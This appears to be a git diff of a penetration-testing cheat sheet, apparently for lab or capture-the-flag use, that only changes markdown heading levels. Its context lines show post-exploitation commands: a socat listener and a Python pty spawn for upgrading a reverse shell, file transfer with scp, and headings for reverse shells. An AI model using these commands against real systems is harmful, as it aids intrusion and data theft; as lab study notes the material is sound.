@@ -4,9 +4,9 @@
 
 ![](https://i.pinimg.com/originals/2a/db/1e/2adb1e4dbe67ce0ff39c4b080f015aa3.jpg)
 
-## Useful Commands
+# Useful Commands
 
-### Create web server
+## Create web server
 
 * #### With Python
 
@@ -18,7 +18,7 @@ python3 -m http.server 8888
 python -m SimpleHTTPServer 8888
 ```
 
-### Upgrade reverse shell
+## Upgrade reverse shell
 
 * #### With Socat
 
@@ -41,7 +41,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-### Send files
+## Send files
 
 * #### With netcat
 
@@ -80,7 +80,7 @@ scp user@10.10.10.77:/home/user/file.txt /home/kali/
 scp -r /home/kali/file.txt user@10.10.10.77:/home/user/
 ```
 
-### Reverse shells
+## Reverse shells
 
 * #### With bash
 
